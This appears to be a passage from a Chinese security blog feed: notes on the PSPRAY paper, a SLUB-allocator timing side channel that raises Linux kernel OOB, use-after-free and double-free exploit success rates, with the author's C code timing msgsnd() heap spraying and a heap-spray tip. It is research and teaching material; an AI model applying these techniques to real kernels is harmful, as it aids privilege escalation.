src="https://s2.loli.net/2023/09/13/ZpbTYHlzVqhLmO5.png"></p><h4 id="Probability-model"><a href="#Probability-model" class="headerlink" title="Probability model"></a>Probability model</h4><p>在开启 freelist 随机化之后的漏洞利用成功率如下，基于 Linux kernel 使用 <code>Fisher-Yates shuffle</code> 算法来进行随机化这个前提计算的，其中 $N$ 为一张 slub 上的总对象数，同时我们假设在同一张 slab 上分配了 1 个漏洞对象与 $k$ 个 victim 对象：</p><p>$$<br>\frac{ _{N-1} C _{k}* _{k} C _{1}}{ _{N} C _{k} * _{N-k} C _{1}} &#x3D; \frac{k}{N}<br>$$</p><p>总体而言，我们从 $N$ 个空闲对象中选择 $k$ 个 victim 对象 与 1 个漏洞对象，在进行利用时 victim 对象与漏洞对象必须相邻，因此我们从 $N-1$ 个对象中取出 $k$ 个对象（剩余一个作为漏洞对象），喷射的 victim 对象数量可以从 0 到 $N-1$ ，因此对于带有 random slab freelist 的 OOB 利用而言的成功率计算如下：</p><p>$$<br>P_{OOB}^{Baseline}&#x3D;\frac{\sum_{k&#x3D;0}^{N-1}\frac{k}{N}}{N}&#x3D;\frac{N-1}{2N}<br>$$</p><h2 id="3-2-Use-After-Free-and-Double-Free"><a href="#3-2-Use-After-Free-and-Double-Free" class="headerlink" title="3.2 Use-After-Free and Double-Free"></a>3.2 Use-After-Free and Double-Free</h2><h4 id="UAF-exploitation-method"><a href="#UAF-exploitation-method" class="headerlink" title="UAF exploitation method"></a>UAF exploitation method</h4><p>UAF 漏洞的利用通常是要将漏洞对象与 victim 对象放在同一内存地址，图 6 展示了对 CVE-2019-2215 的利用过程，首先用 <code>epoll_ctl()</code> 分配漏洞对象，接下来用 <code>ioctl()</code> 释放漏洞对象，随后用 <code>msgsnd()</code> 取回刚刚释放的对象，最后再用 <code>close()</code> 将该对象释放</p><p><img src="https://s2.loli.net/2023/09/15/mP3yD9Yq2lKIgWQ.png"></p><h4 id="DF-exploitation-method"><a href="#DF-exploitation-method" class="headerlink" title="DF exploitation method"></a>DF exploitation method</h4><blockquote><p>在笔者看来 DF 和 UAF 本质上是一样的</p></blockquote><p>Double Free 漏洞则是将一个已经被释放的对象再次释放，从而通过留下的垂悬指针完成利用（笔者注：其实就是 UAF 嘛），图 7 展示了对 CVE-2017-6074 的利用过程，首先通过 <code>connect()</code> 分配漏洞对象与三个额外的对象冰释放掉漏洞对象，随后通过 <code>msgsnd()</code> 分配 victim 对象，接下来通过 <code>shutdown()</code> 完成 DF 将 victim 对象释放掉，最后分配目标对象，当我们访问 victim 对象时目标对象便会被破坏</p><p><img src="https://s2.loli.net/2023/09/15/mZLUcSAIPhW7TOJ.png"></p><h4 id="Failure-cases-1"><a href="#Failure-cases-1" class="headerlink" title="Failure cases"></a>Failure cases</h4><p>由于 SLUB 的特性，对 UAF 与 DF 漏洞的利用是有可能失败的，图 8 显示了利用 UAF&#x2F;DF 漏洞失败的一种可能性，即额外的“噪声”分配导致了 perCPU page 发生了改变</p><blockquote><p>笔者注：比如说 <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">key_ctl</a> 这样的</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/revXByanRGVKmS1.png"></p><h4 id="Probability-model-1"><a href="#Probability-model-1" class="headerlink" title="Probability model"></a>Probability model</h4><p>UAF 与 DF 漏洞利用的成功率如下，$N$ 为每张 slab 上的对象数量， $A$ 为系统调用所分配的对象数量（即分配的漏洞对象数量与额外结构体的数量之和）：</p><p><img src="https://s2.loli.net/2023/09/16/so5iPEvlCcuBtjN.png"></p><blockquote><p>这里用 Latex 打不出来只能上图了，因为笔者博客的 latex 支持非常残疾（悲</p></blockquote><p>有两种情况：当 <code>A &lt; N</code> 时，成功率决定于漏洞对象与额外对象是否在同一张 slab 上；当 <code>A &gt;= N</code> 时，当分配漏洞对象的系统调用所分配的最后一个对象完全填充 CPU page 时利用将会成功，若一张 slab 被耗尽，对应的 slab 会被移动到 full 链表上，CPU page 便变为空，此时若对象被释放，则包含该对象的 slab 将重新变为 CPU page</p><h1 id="0x04-Our-Approach-PSPRAY"><a href="#0x04-Our-Approach-PSPRAY" class="headerlink" title="0x04. Our Approach : PSPRAY"></a>0x04. Our Approach : PSPRAY</h1><p>漏洞利用失败的主要原因是对 slab 信息的缺失，本文找到了一种能够获取 slab 的部分分配信息的时序侧信道方法，从而提高利用成功概率</p><h2 id="4-1-Timing-Side-Channel-on-SLUB-allocator"><a href="#4-1-Timing-Side-Channel-on-SLUB-allocator" class="headerlink" title="4.1 Timing Side-Channel on SLUB allocator"></a>4.1 Timing Side-Channel on SLUB allocator</h2><p>如图 2.1 所示，SLUB 有五条不同深度的分配路径以优化性能表现，为了弄清不同路径的表现，作者通过 <code>msgsnd()</code> 系统调用（如图 4.3 所示其仅分配一个对象）测试了从 <code>kmalloc()</code> 的核心函数 <code>slab_alloc_node()</code> 的开始到结尾的性能，经过多轮测试发现 <code>slow-path</code> 与其他路径相比存在明显的表现差距，因此攻击者可以通过测量分配时间得知内存分配所经历的路径</p><h2 id="4-2-Inferring-Allocation-Status"><a href="#4-2-Inferring-Allocation-Status" class="headerlink" title="4.2 Inferring Allocation Status"></a>4.2 Inferring Allocation Status</h2><p> <code>slow-path</code> 以外的分配路径的分配状态都是难以确定的，但 <code>slow-path</code> 的行为与其他路径不同，此时内核会从 buddy system 分配一张新 slab，由此我们可以知道当前的 slab 刚被分配且仅分配了一个对象</p><h2 id="4-3-Proof-Of-Concept"><a href="#4-3-Proof-Of-Concept" class="headerlink" title="4.3 Proof-Of-Concept"></a>4.3 Proof-Of-Concept</h2><h4 id="Finding-an-adequate-system-call"><a href="#Finding-an-adequate-system-call" class="headerlink" title="Finding an adequate system call"></a>Finding an adequate system call</h4><p>为了使用时序侧信道，我们需要找到满足以下三个条件的系统调用：</p><ul><li>普通用户权限可用</li><li>仅分配一个对象</li><li>除了对象分配以外的性能开销要小</li></ul><p>作者修改了 kernel 以在系统调用仅分配一个 <code>kmalloc-xx</code> 中的对象时 panic，并使用 Syzkaller 进行测试，找到了如表 A.1 所示的 23 个满足该条件的系统调用，这些从用户空间拷贝数据的系统调用涵盖了 <code>kmalloc-32</code> 到 <code>kmalloc-8192</code>，同时其内存分配以外的代码不会过于影响内存</p><p><img src="https://s2.loli.net/2023/09/15/5EYjRperomGIhwB.png"></p><h4 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h4><p>简单来说就是用 <code>msgsnd()</code> 做了堆喷 1000 次的测试并测量其表现</p><h4 id="Experiment-Results"><a href="#Experiment-Results" class="headerlink" title="Experiment Results"></a>Experiment Results</h4><p>图 9 为使用 <code>msgsnd()</code> 进行测试的结果，可知 <code>fast-path</code> 与 <code>medium-path</code> 间难以做出区分（都要消耗 10000 左右的 CPU 周期），但 <code>slow-path</code> 可以被区分（要消耗 35000 左右的 CPU 周期）</p><p><img src="https://s2.loli.net/2023/09/15/DhbYf6i1sMHFeLR.png"></p><h1 id="0x05-Application-of-PSPRAY"><a href="#0x05-Application-of-PSPRAY" class="headerlink" title="0x05. Application of PSPRAY"></a>0x05. Application of PSPRAY</h1><h2 id="5-1-OOB-Exploitation"><a href="#5-1-OOB-Exploitation" class="headerlink" title="5.1 OOB Exploitation"></a>5.1 OOB Exploitation</h2><p>图 10 展示了在开启 free list randomization 的情况下对 OOB 漏洞应用 PSPRAY 的过程：</p><ul><li>使用 PSPRAY 确定 <code>slow-path</code> 是否被执行，此时 slab <code>B</code> 被创建且已分配了一个结构体</li><li>接下来我们堆喷 <code>N-1</code> 个对象将其完全分配（假设一张 slab 上有 <code>N</code> 个对象）</li><li>我们接下来的分配又会分配一张新的 slab <code>C</code> ，分配 <code>N - 1</code> 个 victim 对象</li><li>分配漏洞对象，此时若漏洞对象不为 slab 上地址最高处对象，则 OOB 将成功</li></ul><p><img src="https://s2.loli.net/2023/09/15/pBelmXzb6I1fuPH.png"></p><p>利用成功率为：<br>$$<br>P_{OOB}^{PSPRAY}&#x3D;\frac{N-1}{N}<br>$$</p><h2 id="5-2-UAF-and-DF-Exploitation"><a href="#5-2-UAF-and-DF-Exploitation" class="headerlink" title="5.2 UAF and DF Exploitation"></a>5.2 UAF and DF Exploitation</h2><p>图 11 展示了如何在 UAF 与 DF 漏洞上利用 PSPRAY：</p><ul><li>首先用 PSPRAY 找到新 slab 被分配的时间点，此时我们便知道一张已分配一个对象的 slab 被创建了</li><li>然后正常利用 UAF&#x2F;DF</li></ul><blockquote><p>👴寻思好像没啥可讲的</p></blockquote><p><img src="https://s2.loli.net/2023/09/15/wLO8TNY4Q1e7zn5.png"></p><p>利用成功率为：</p><p><img src="https://s2.loli.net/2023/09/16/V6jo4yT2OSLMBAk.png"></p><h1 id="0x06-Attack-Evaluation"><a href="#0x06-Attack-Evaluation" class="headerlink" title="0x06. Attack Evaluation"></a>0x06. Attack Evaluation</h1><p>论文里这一节主要是做测试</p><h2 id="6-1-Synthetic-Vulnerability"><a href="#6-1-Synthetic-Vulnerability" class="headerlink" title="6.1 Synthetic Vulnerability"></a>6.1 Synthetic Vulnerability</h2><p>主要是作者自己开发漏洞自己打，测试用的 OOB 洞长这个样子：</p><p><img src="https://s2.loli.net/2023/09/15/CAsp71oLIZPBykf.png"></p><p>UAF 洞长这个样子：</p><p><img src="https://s2.loli.net/2023/09/15/kW8aPNTIxOEsBnr.png"></p><p>结果如表 1 所示：</p><p><img src="https://s2.loli.net/2023/09/15/DpNMjv3GAdstokR.png"></p><h2 id="6-2-Real-World-Vulnerability"><a href="#6-2-Real-World-Vulnerability" class="headerlink" title="6.2 Real-World Vulnerability"></a>6.2 Real-World Vulnerability</h2><p>打了一些真实的洞，结果如表 2 所示，和公开的 exp 相比利用成功率提升明显：</p><p><img src="https://s2.loli.net/2023/09/15/rGhvEOywRWi6S1B.png"></p><h1 id="0x07-Mitigation"><a href="#0x07-Mitigation" class="headerlink" title="0x07. Mitigation"></a>0x07. Mitigation</h1><p>PSPRAY 主要有两个点：</p><ul><li><code>slow-path</code> 的分配速度差异明显</li><li><code>slow-path</code> 的出现意味着此时的 freelist 为空</li></ul><p>作者认为针对 PSPRAY 的防御手段主要有以下两个：</p><ul><li>让所有的分配路径都有着相似的性能表现（针对第一个点）</li><li>随机化 <code>slow-path</code> 分配上下文（针对第二个点）</li></ul><h3 id="Mitigation-1-Uniform-Allocation-Performance"><a href="#Mitigation-1-Uniform-Allocation-Performance" class="headerlink" title="Mitigation #1. Uniform Allocation Performance."></a>Mitigation #1. Uniform Allocation Performance.</h3><p>基本没啥活可以整</p><h3 id="Mitigation-2-Randomized-Slow-path-Allocation-Context"><a href="#Mitigation-2-Randomized-Slow-path-Allocation-Context" class="headerlink" title="Mitigation #2. Randomized Slow-path Allocation Context."></a>Mitigation #2. Randomized Slow-path Allocation Context.</h3><p>主要是让分配并不是在 freelist 为空时才进入到 <code>slow-path</code> ，这里设计了一个简易的算法就是让 slab 上对象的 idx 与一个常量相等且 CPU partial 为空时进到一个新的 slow path，从而使得这两个 slow path 无法被区分</p><p><img src="https://s2.loli.net/2023/09/15/EnYdvIbhfp4FkUS.png"></p><p>图 12 显示了这种方法的基本原理：</p><p><img src="https://s2.loli.net/2023/09/15/yNGZAbSz7qaJfrs.png"></p><h1 id="0x08-Discussion"><a href="#0x08-Discussion" class="headerlink" title="0x08. Discussion"></a>0x08. Discussion</h1><h2 id="8-1-The-Noise"><a href="#8-1-The-Noise" class="headerlink" title="8.1 The Noise"></a>8.1 The Noise</h2><p>由调度器带来的噪音仍可以阻碍利用，主要来自两种机制：CPU 迁移与上下文切换；这样的噪声可以在分配&#x2F;释放一个目标对象或漏洞对象时出现</p><blockquote><p>👴感觉用 <code>sched_setaffinity()</code> 绑核可以完美解决这个问题</p></blockquote><h2 id="8-2-The-Other-OSes"><a href="#8-2-The-Other-OSes" class="headerlink" title="8.2 The Other OSes"></a>8.2 The Other OSes</h2><p>其他的 OSes 也可以采用 PSPRAY 方法进行利用，因为其采用与 Linux 相类似的堆分配器，作者这里测了 FreeBSD 和 XNU，具体的笔者就不贴了：）</p><h1 id="0x09-Related-work"><a href="#0x09-Related-work" class="headerlink" title="0x09. Related work"></a>0x09. Related work</h1><h3 id="Kernel-Automated-Exploit-Generation"><a href="#Kernel-Automated-Exploit-Generation" class="headerlink" title="Kernel Automated Exploit Generation"></a>Kernel Automated Exploit Generation</h3><p>自动化利用，如 <a href="https://www.usenix.org/conference/usenixsecurity18/presentation/wu-wei">FUZE</a> 用 fuzz 和符号执行来构造利用，<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/chen-weiteng">KOOBE</a> 则针对 OOB 类漏洞进行自动化利用生成</p><blockquote><p>AEG 说实话还是挺有意思的，可惜笔者之前确实没咋关注过：）</p></blockquote><h3 id="Kernel-Exploit-Techniques"><a href="#Kernel-Exploit-Techniques" class="headerlink" title="Kernel Exploit Techniques"></a>Kernel Exploit Techniques</h3><p>类似的利用技术相关的研究有 ret2usr、<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">ret2dir</a>、<a href="https://www.usenix.org/conference/usenixsecurity21/presentation/lee-yoochan">ExpRace</a>、<a href="https://dl.acm.org/doi/10.1145/3372297.3423353">Eloise</a> 等</p><h3 id="Timing-Side-Channel-Attack-against-Kernel"><a href="#Timing-Side-Channel-Attack-against-Kernel" class="headerlink" title="Timing Side-Channel Attack against Kernel"></a>Timing Side-Channel Attack against Kernel</h3><p>对时序侧信道技术的研究也很多，比如说 <a href="https://ieeexplore.ieee.org/document/6547110">https://ieeexplore.ieee.org/document/6547110</a>、<a href="https://dl.acm.org/doi/10.1145/2976749.2978321">DRK</a>、<a href="https://www.usenix.org/conference/usenixsecurity18/presentation/lipp">Meltdown</a> 等</p><h1 id="0x0A-Conclusion"><a href="#0x0A-Conclusion" class="headerlink" title="0x0A. Conclusion"></a>0x0A. Conclusion</h1><p>这篇论文基于 SLUB 分配器的构造提出了名为 $PSPRAY$ 的时序侧信道利用手法，经测试能够有效提升 OOB 与 UAF&#x2F;DF 漏洞的利用成功率</p><blockquote><p>👴寻思好像也没啥好讲的</p></blockquote><h1 id="0xFF-What’s-more"><a href="#0xFF-What’s-more" class="headerlink" title="0xFF. What’s more?"></a>0xFF. What’s more?</h1><p>笔者自己也试了一下这个方法，发现<strong>slow-path 的执行时间确实可以与其他路径进行区分</strong>（只需要用一些统计学手段就好），下面是笔者自己测试用的代码，<strong>在真机测试与 QEMU 虚拟机测试中 slow-path 都表现出了显著的性能开销，这意味着这种方法确乎可以被应用于 CTF 与实战当中</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">del_msg_queue</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msqid_ds</span> <span class="hljs-title">ds_buf</span>;</span><br>    <span class="hljs-keyword">return</span> msgctl(msqid, IPC_RMID, &amp;ds_buf);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">rdtsc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> lo, hi;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;rdtsc&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (lo), <span class="hljs-string">&quot;=d&quot;</span> (hi)</span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">return</span> (((<span class="hljs-type">uint64_t</span>) hi) &lt;&lt; <span class="hljs-number">32</span>) | lo;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">uint64_t</span> exec_time[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        msqid[i] = get_msg_queue();<br>        <span class="hljs-keyword">if</span> (msqid[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to get %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to get msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    *(<span class="hljs-type">size_t</span>*) buf = <span class="hljs-number">123456</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> begin, end;<br><br>        begin = rdtsc();<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to send %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to alloc msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        end = rdtsc();<br><br>        exec_time[i] = end - begin;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (read_msg(msqid[i],buf,<span class="hljs-number">512</span>-<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg),<span class="hljs-number">0xdeadbeef</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to read %d msg!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_msg&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (del_msg_queue(msqid[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] FAILD to delete %d msg_queue!\n&quot;</span>, i);<br>            perror(<span class="hljs-string">&quot;FAILED to free msg_queue&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Execute time for no.%d msgsnd(): %ld\n&quot;</span>, i, exec_time[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果其实还是挺明显的，不过需要注意的是主流发行版的 <code>kmalloc-512</code> 的 slab 大小和我们平时打CTF 用的内核的不一定一样</p><blockquote><p> 笔者真机环境这个是 <code>16</code> 个 512 对象一张 slab，CTF 环境通常是 <code>8</code> 个512 对象一张 slab</p></blockquote><p><img src="https://s2.loli.net/2023/09/16/ZtAB2MvgWib8Qhf.png" alt="image.png"></p><p>不过在笔者看来<strong>我们其实并没有必要使用 PSPRAY 方法进行利用，即没有必要手动获取分配新的 slab 页面的时间</strong>，还是以 OOB 堆喷为例，当堆喷到一定数量级的时候其实都会向 buddy system 请求新的页面，那我们可以简单拆为如下四段式利用：</p><ul><li>首先堆喷大量同大小对象耗空 partial slab，迫使 SLUB 请求新页</li><li>堆喷目标对象，让 SLUB 再取新页</li><li>分配漏洞对象</li><li>堆喷目标对象，让 SLUB 再取新页</li></ul><p>这种方法<strong>本质上与 PSPRAY 所达成的效果一致，因为实质上我们并不需要判断新 slab 页面的分配时间，只需要达成使用目标对象将漏洞对象包裹的效果即可</strong>，这也是笔者所常用的利用技巧之一 ：）</p><blockquote><p>参见笔者出的一道 CTF 题目：<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 - d3kcache</a>，里面便使用了这种方法进行辅助</p></blockquote><p>不过无论如何，$PSPRAY$ 论文的作者确乎向我们展示了一种<strong>非常有趣且实用的漏洞利用技巧</strong>，让笔者受益匪浅</p><blockquote><p><del>希望笔者有一天也能像这群大佬那样发一堆顶会</del></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;🎵THIS IS MY KINGDOM C*M🎵&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x00】使用 Docker 创建隔离的工作环境</title>
    <link href="https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/"/>
    <id>https://arttnba3.github.io/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/</id>
    <published>2023-08-31T11:55:24.000Z</published>
    <updated>2023-09-26T06:12:12.000Z</updated>
    
